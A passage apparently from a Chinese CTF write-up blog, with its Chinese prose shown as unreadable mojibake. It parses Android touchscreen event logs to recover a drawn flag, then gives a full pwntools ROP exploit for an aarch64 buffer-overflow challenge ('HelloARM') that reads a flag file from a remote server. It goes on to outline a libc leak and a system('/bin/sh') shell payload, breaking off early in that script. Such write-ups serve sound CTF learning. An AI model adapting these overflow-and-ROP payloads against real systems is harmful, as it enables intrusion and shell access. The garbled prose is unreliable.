             SW  (0005): SW_PEN_INSERTED        input props:    INPUT_PROP_DIRECT
</code></pre><pre tabindex=0><code>add device 2: /dev/input/event2
  name:     &#34;sec_touchscreen&#34;
  events:
    KEY (0001): 00ac  0145  014a  01c7 
    ABS (0003): 0000  : value 0, min 0, max 1439, fuzz 0, flat 0, resolution 0
                0001  : value 0, min 0, max 2959, fuzz 0, flat 0, resolution 0
                0018  : value 0, min 0, max 63, fuzz 0, flat 0, resolution 0
                002f  : value 0, min 0, max 9, fuzz 0, flat 0, resolution 0
                0030  : value 0, min 0, max 255, fuzz 0, flat 0, resolution 0
                0031  : value 0, min 0, max 255, fuzz 0, flat 0, resolution 0
                0035  : value 0, min 0, max 1439, fuzz 0, flat 0, resolution 0
                0036  : value 0, min 0, max 2959, fuzz 0, flat 0, resolution 0
                0039  : value 0, min 0, max 65535, fuzz 0, flat 0, resolution 0
                003a  : value 0, min 0, max 63, fuzz 0, flat 0, resolution 0
                003e  : value 126, min 0, max 65535, fuzz 0, flat 0, resolution 0
    SW  (0005): 000f 
  input props:
    INPUT_PROP_DIRECT
</code></pre><p>è¿™æ¬¡æˆ‘ä»¬åªçœ‹<code>ABS (0003):</code>é‡Œçš„<code>ABS_MT_POSITION_X</code>å’Œ<code>ABS_MT_POSITION_Y</code></p><p>æ¯”å¦‚ä¸‹é¢è¿™ä¸¤æ¡è¾“å‡ºï¼šç¬¬äºŒåˆ—ä¸º<code>ABS (0003):</code>ï¼Œç¬¬ä¸‰åˆ—åˆ†åˆ«ä¸º<code>ABS_MT_POSITION_X</code>å’Œ<code>ABS_MT_POSITION_Y</code>ï¼Œç¬¬ä¸‰åˆ—çš„å€¼åˆ™æ˜¯å±å¹•åƒç´ ç‚¹åæ ‡ã€‚</p><pre tabindex=0><code>[  270524.032103] 0003 0035 00000487
[  270524.032103] 0003 0036 000007b9
</code></pre><p>è€è§„çŸ©ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬æ¥è§£å†³è¿™ä»¶äº‹æƒ…</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> matplotlib.pyplot <span style=color:#66d9ef>as</span> plt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># input_strså¤ªé•¿äº†ï¼Œ è¿™é‡Œåªæ”¾ä¸€éƒ¨åˆ†</span>
</span></span><span style=display:flex><span>input_strs <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;[  270488.473135] 0003 0039 0000e822
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.473135] 0001 014a 00000001
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.473135] 0001 0145 00000001
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.473135] 0003 0035 00000076
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.473135] 0003 0036 0000025b
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.473135] 0003 0030 0000000b
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.473135] 0003 0031 0000000b
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.473135] 0003 003a 00000007
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.473135] 0000 0000 00000000
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.497634] 0003 0030 0000000a
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.497634] 0003 0031 0000000a
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.497634] 0003 003a 00000006
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[  270488.497634] 0000 0000 00000000
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cur_x <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>cur_y <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>xs <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>ys <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> input_strs<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> line[<span style=color:#ae81ff>18</span>:<span style=color:#ae81ff>22</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;0003&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> line[<span style=color:#ae81ff>23</span>:<span style=color:#ae81ff>27</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;0035&#39;</span>:
</span></span><span style=display:flex><span>            cur_x <span style=color:#f92672>=</span> int(line[<span style=color:#ae81ff>28</span>:<span style=color:#ae81ff>36</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> line[<span style=color:#ae81ff>23</span>:<span style=color:#ae81ff>27</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;0036&#39;</span>:
</span></span><span style=display:flex><span>            cur_y <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>int(line[<span style=color:#ae81ff>28</span>:<span style=color:#ae81ff>36</span>], <span style=color:#ae81ff>16</span>) <span style=color:#75715e># ç¿»è½¬</span>
</span></span><span style=display:flex><span>            xs<span style=color:#f92672>.</span>append(cur_x)
</span></span><span style=display:flex><span>            ys<span style=color:#f92672>.</span>append(cur_y)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>plt<span style=color:#f92672>.</span>scatter(xs, ys, alpha<span style=color:#f92672>=</span><span style=color:#ae81ff>0.6</span>)
</span></span><span style=display:flex><span>plt<span style=color:#f92672>.</span>show()
</span></span></code></pre></div><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸æ•°å­¦ä¸­çš„äºŒä½åæ ‡ä¸åŒï¼ŒAndroidå±å¹•çš„åæ ‡åŸç‚¹åœ¨å±å¹•å·¦ä¸Šè§’ï¼Œå› æ­¤yè½´çš„æ–¹å‘æ˜¯å‘ä¸‹çš„ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªè´Ÿå·æ¥ç¿»è½¬å›¾åƒã€‚</p><p><img src=/images/blog/66/image-20201019130558172.png alt=image-20201019130558172></p><p>å±å¹•æ‰‹åŠ¿çš„å†…å®¹å°±æ˜¯flagå•¦</p><h2 id=helloarm>HelloARM</h2><p>è¿™é¢˜æ˜¯ä¸€é“armçš„pwné¢˜ï¼Œæ€è·¯æ˜¯ROPï¼Œç»™çš„ç¨‹åºåŒ…å«ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><pre tabindex=0><code>Archive:  HelloARM-d16411d0de1ce65a122d8f567ff53897.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-10-05 17:31   lib/
  1345176  2020-10-05 17:30   lib/libc-2.27.so
   125896  2020-10-05 17:31   lib/ld-linux-aarch64.so.1
     9760  2020-10-04 22:14   HelloARM
---------                     -------
  1480832                     4 files
</code></pre><p>é¦–å…ˆchecksecçœ‹ä¸€ä¸‹ï¼š</p><p><img src=/images/blog/66/image-20201019142904415.png alt=image-20201019142904415></p><p>æ˜¯aarch64å°ç«¯çš„ç¨‹åºï¼Œå¯ä»¥å‘ç°å¼€å¯äº†NXï¼Œæ„å‘³ç€æˆ‘ä»¬ä¸èƒ½åœ¨æ ˆä¸Šæ‰§è¡Œä»£ç ï¼Œæ²¡å¼€PIEæ„å‘³ç€åœ°å€ä¸æ˜¯éšæœºçš„ã€‚</p><p>å…ˆç”¨qemuè·‘ä¸€ä¸‹ç¨‹åºï¼š</p><pre tabindex=0><code>qemu-aarch64 -L ./ ./HelloARM
</code></pre><p><img src=/images/blog/66/image-20201019132755929.png alt=image-20201019132755929></p><p>æ€»çš„æ¥è¯´ç¨‹åºå…ˆç»™å‡ºä¸€ä¸ªMagic numberï¼Œç„¶åä¼šæœ‰ä¸¤è½®è¾“å…¥è¾“å‡ºçš„äº¤äº’ã€‚</p><p>æ¥ä¸‹æ¥ç”¨idaåˆ†æï¼Œmainå‡½æ•°å…ˆå»æ‰§è¡Œinitå‡½æ•°ï¼Œå…¶ä¸­ä¼šæ‰“å¼€å½“å‰ç›®å½•ä¸‹çš„ä¸€ä¸ª<code>./flag</code>æ–‡ä»¶ï¼Œå¹¶æŠŠæ–‡ä»¶æè¿°ç¬¦å­˜åˆ°å…¨å±€å˜é‡<code>fd</code>é‡Œé¢ï¼Œmainå‡½æ•°å†…éƒ¨åœ¨æ ˆä¸Šå¼€è¾Ÿäº†ä¸€ä¸ªç¼“å†²åŒºï¼ŒMagic numberå°±æ˜¯è¿™ä¸ªç¼“å†²åŒºçš„æ ˆåœ°å€ï¼Œéšåä¼šè¯»å…¥å¤§å°ä¸º0x10çš„å†…å®¹åˆ°bssæ®µçš„<code>name</code>æ•°ç»„ä¸­ï¼Œéšåæ‰“å°è¿™ä¸²å†…å®¹ï¼Œæœ€åè¿›å…¥<code>oooooo()</code>å‡½æ•°ï¼Œå‡½æ•°å†…éƒ¨å¼€è¾Ÿäº†0x100å¤§å°çš„æ ˆä¸Šæ•°ç»„ç”¨æ¥å­˜ç”¨æˆ·è¾“å…¥çš„messageï¼Œä½†è¿™é‡Œå­˜åœ¨æº¢å‡ºæ¼æ´ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯ï¼Œaarch64ç”¨X30è¿™ä¸ªå¯„å­˜å™¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨çš„è¿”å›åœ°å€ï¼Œå¹¶åœ¨è¿›å…¥å­å‡½æ•°åå°†X30ä¸­çš„è¿”å›åœ°å€å‹å…¥æ ˆä¸­ã€‚æ¯”è¾ƒç‰¹åˆ«çš„æ˜¯<code>oooooo()</code>å‡½æ•°ä¸­ï¼Œæ ˆä¸Šæ•°ç»„çš„åœ°å€æ¯”å­˜æ”¾X30å†…å®¹çš„åœ°å€é«˜ï¼Œå› æ­¤æ— æ³•åŠ«æŒ<code>oooooo()</code>çš„<code>ret</code>æŒ‡ä»¤ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥åŠ«æŒ<code>main()</code>çš„<code>ret</code>æŒ‡ä»¤ã€‚</p><p>æ‰¾åˆ°åˆ‡å…¥ç‚¹åï¼Œæˆ‘ä»¬å°è¯•å¯»æ‰¾å¯ç”¨çš„<code>gadget</code>ï¼Œå¯»æ‰¾ä¸€ç•ªæ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ã€‚ä½†æ˜¯è¯¥ç¨‹åºä¸­åŒ…å«ä¸€ä¸ª<code>__libc_csu_init()</code>å‡½æ•°ï¼Œåˆ©ç”¨è¯¥å‡½æ•°ä¸­çš„ç‰¹æ®Šç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šå‚æ•°å¹¶å®Œæˆä»»æ„å‡½æ•°çš„è°ƒç”¨ã€‚</p><p><img src=/images/blog/66/image-20201019134343835.png alt=image-20201019134343835></p><p>æœ€åè¿™é¢˜çš„æ€è·¯ä¸»è¦æ˜¯ï¼š</p><ul><li>ç”¨<code>oooooo()</code>çš„ç¼“å†²åŒºæº¢å‡ºåŠ«æŒ<code>main()</code>çš„<code>ret</code>æŒ‡ä»¤ï¼Œè®©å®ƒè·³è½¬åˆ°<code>__libc_csu_init()</code>å‡½æ•°å†…éƒ¨<code>.text:0000000000400AD0</code>åœ°å€å¤„ï¼ˆä¸Šå›¾ï¼‰ã€‚</li><li>ç„¶åæˆ‘ä»¬é€šè¿‡ç²¾å¿ƒæ„é€ æº¢å‡ºéƒ¨åˆ†çš„å†…å®¹ï¼Œè®©ç¨‹åºå»è°ƒç”¨.pltè¡¨ä¸­çš„<code>read()</code>å‡½æ•°ï¼Œè¯»å‡º<code>./flag</code>æ–‡ä»¶çš„å†…å®¹ï¼ˆè¿™é‡Œæˆ‘ä»¬çŒœæµ‹æœåŠ¡å™¨ä¸Šfdçš„å€¼æ˜¯3ï¼Œæœ¬åœ°æµ‹è¯•qemuä¸Šè¿è¡Œæ—¶fdæ˜¯5ï¼‰ï¼Œæ”¾åˆ°<code>main()</code>å‡½æ•°æ ˆä¸Šçš„ç¼“å†²åŒºä¸­ï¼ˆå³magic numberç»™å‡ºçš„åœ°å€ï¼‰ã€‚</li><li>ç„¶åå†ä¸€æ¬¡åˆ©ç”¨<code>__libc_csu_init()</code>å‡½æ•°ï¼Œè°ƒç”¨ä¸€ä¸ª<code>write()</code>å‡½æ•°ï¼Œå°†magic numberå¤„çš„å†…å®¹å†™åˆ°æ ‡å‡†è¾“å…¥é‡Œã€‚</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;aarch64&#39;</span>
</span></span><span style=display:flex><span>Debug <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>elf<span style=color:#f92672>=</span>ELF(<span style=color:#e6db74>&#39;./HelloARM&#39;</span>, checksec <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc<span style=color:#f92672>=</span>ELF(<span style=color:#e6db74>&#34;./lib/libc.so.6&#34;</span>, checksec <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_sh</span>(other_libc <span style=color:#f92672>=</span> null):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> remote(<span style=color:#e6db74>&#39;10.104.255.210&#39;</span>, <span style=color:#ae81ff>7777</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e># global libc</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># if args[&#39;REMOTE&#39;]:</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     if other_libc is not null:</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#         libc = ELF(&#34;./&#34;, checksec = False)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     return remote(&#39;10.104.255.210&#39;, 7777)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># elif Debug:</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     sh = process([&#34;qemu-aarch64&#34;, &#34;-g&#34;, &#34;2333&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     log.info(&#39;Please use GDB remote!(Enter to continue)&#39;)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     raw_input()</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     return sh</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># else :</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     return process([&#34;qemu-aarch64&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn <span style=color:#f92672>=</span> get_sh()
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>bb <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>hex_magic <span style=color:#f92672>=</span> bb[<span style=color:#ae81ff>15</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>addr_magic <span style=color:#f92672>=</span> int(hex_magic, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>guess_fd <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>flag_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x20</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>recv()
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;imlk____________&#39;</span>)
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>recv()
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x100</span>)<span style=color:#f92672>.</span>encode() <span style=color:#75715e># å¡«å……</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>) <span style=color:#75715e># x29</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AD0</span>) <span style=color:#75715e># x30 for ret to __libc</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x32</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x0</span>: 
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400730</span>) <span style=color:#75715e># set to write func pointer</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x1</span>: <span style=color:#75715e># addr_magic-0x08 for w</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400760</span>) <span style=color:#75715e># set to read func pointer</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2</span>: <span style=color:#75715e># addr_magic</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#75715e># addr_magic-0x28 for x19</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x22</span>:<span style=color:#75715e># x29</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x23</span>:<span style=color:#75715e># x30</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AB0</span>) <span style=color:#75715e># for ret to __libc stage 2</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x25</span>: <span style=color:#75715e># x20</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>) <span style=color:#75715e># to compare with x19, mark read() finished</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x26</span>: <span style=color:#75715e># x21</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x27</span>: <span style=color:#75715e># x22</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(guess_fd)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x28</span>: <span style=color:#75715e># x23</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x29</span>: <span style=color:#75715e># x24</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(flag_len)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2a</span>: <span style=color:#75715e># x29</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2b</span>: <span style=color:#75715e># x30</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AB0</span>) <span style=color:#75715e># for ret to __libc stage 2</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2d</span>: <span style=color:#75715e># x20</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>) <span style=color:#75715e># to compare with x19, mark write() finished</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2e</span>: <span style=color:#75715e># x21</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x2f</span>: <span style=color:#75715e># x22</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x30</span>: <span style=color:#75715e># x23</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x31</span>: <span style=color:#75715e># x24</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(flag_len)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>+=</span> p64(i)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>send(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    conn<span style=color:#f92672>.</span>recv()
</span></span></code></pre></div><p>çœ‹åˆ°flagäº†ï¼š</p><p><img src=/images/blog/66/image-20201019135329078.png alt=image-20201019135329078></p><p>éœ€è¦æ³¨æ„çš„æ˜¯åˆå§‹åŒ–æ—¶ç”¨<code>alarm()</code>å‡½æ•°ï¼Œè®¾å®šäº†ä¸€ä¸ªå®šæ—¶å™¨ï¼Œä¼šåœ¨1åˆ†é’Ÿå†…ç»“æŸç¨‹åºï¼Œåœ¨gdbè°ƒè¯•è¿‡ç¨‹ä¸­å›å¾ˆéš¾å—ã€‚å¯ä»¥ç”¨idaç»™ç¨‹åºæ‰“patchï¼ŒæŠŠå¯¹<code>alarm()</code>çš„è°ƒç”¨æ¢æˆ<code>nop</code></p><h2 id=helloarmshell>HelloARMShell</h2><p>è¿™æ¬¡æˆ‘ä»¬éœ€è¦åœ¨ä¸Šä¸€æ¬¡çš„åŸºç¡€ä¸Šget shellï¼Œå³æ‰§è¡Œ<code>system("/bin/sh")</code>ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å‡†å¤‡å‚æ•°<code>"/bin.sh"</code>å’Œ<code>system()</code>å‡½æ•°çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ<code>"/bin.sh"</code>æ”¾åˆ°ç¬¬ä¸€æ¬¡è¾“å…¥çš„<code>name</code>å­—æ®µï¼Œå› ä¸º<code>name</code>çš„åœ°å€æ˜¯é™æ€çš„ï¼Œä¼šæ–¹ä¾¿å¾ˆå¤šã€‚</p><p>è‡³äº<code>system()</code>å‡½æ•°çš„åœ°å€ï¼Œè¿™ä¸ªç¨‹åºå¹¶æ²¡æœ‰è¿æ¥åˆ°<code>system()</code>å‡½æ•°ï¼Œæ‰€ä»¥æ— æ³•åœ¨pltè¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„é¡¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆè·å–åˆ°<code>.got</code>è¡¨ä¸­<code> write()</code>å‡½æ•°çš„ åœ°å€ï¼Œç„¶åé€šè¿‡åç§»é‡ç®—å‡º<code>system()</code>å‡½æ•°çš„åœ°å€ã€‚</p><p>åç§»é‡çš„è®¡ç®—å¯ä»¥åœ¨æœ¬æœºé€šè¿‡è§£æ<code>libc.so</code>æ–‡ä»¶æ¥è§£å†³ã€‚</p><p>æœ€åï¼Œè¿™é¢˜çš„æ€è·¯ä¸»è¦æ˜¯ï¼š</p><ul><li><p>ç”¨<code>oooooo()</code>çš„ç¼“å†²åŒºæº¢å‡ºåŠ«æŒ<code>main()</code>çš„<code>ret</code>æŒ‡ä»¤ï¼Œè®©å®ƒè·³è½¬åˆ°<code>__libc_csu_init()</code>å‡½æ•°å†…éƒ¨<code>.text:0000000000400AD0</code>åœ°å€å¤„ï¼ˆä¸Šå›¾ï¼‰ã€‚</p></li><li><p>ç„¶åæˆ‘ä»¬é€šè¿‡ç²¾å¿ƒæ„é€ æº¢å‡ºéƒ¨åˆ†çš„å†…å®¹ï¼Œè®©ç¨‹åºå»è°ƒç”¨.pltè¡¨ä¸­çš„<code>write()</code>å‡½æ•°ï¼Œå¾€æ ‡å‡†è¾“å‡ºä¸­å†™å‡º<code>.got</code>è¡¨ä¸­<code>write()</code>å‡½æ•°å¯¹åº”ä½ç½®çš„ï¼Œ8ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œè¿™å°±æ˜¯è¿è¡Œæ—¶<code>libc.so</code>ä¸­<code>write()</code>å‡½æ•°çš„åœ°å€ã€‚</p></li><li><p>æœ¬æœºçš„pyè„šæœ¬è¯»å–åˆ°åœ°å€åï¼ŒåŠ ä¸Šåç§»é‡è®¡ç®—å‡º<code>system()</code>å‡½æ•°çš„åœ°å€ï¼Œå‘é€ç»™ç¨‹åºã€‚</p></li><li><p>å¯¹åº”çš„ï¼Œæˆ‘ä»¬å†ä¸€æ¬¡åˆ©ç”¨<code>__libc_csu_init()</code>å‡½æ•°ï¼Œè°ƒç”¨ä¸€ä¸ª<code>read()</code>å‡½æ•°ï¼Œè¯»å…¥ç®—å¥½çš„<code>system()</code>å‡½æ•°åœ°å€ã€‚</p></li><li><p>æœ€åæˆ‘ä»¬åˆ©ç”¨<code>__libc_csu_init()</code>å‡½æ•°ï¼Œè°ƒç”¨<code>system()</code>å‡½æ•°ï¼ŒæˆåŠŸget shell</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;aarch64&#39;</span>
</span></span><span style=display:flex><span>Debug <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./HelloARM&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./lib/libc.so.6&#34;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>
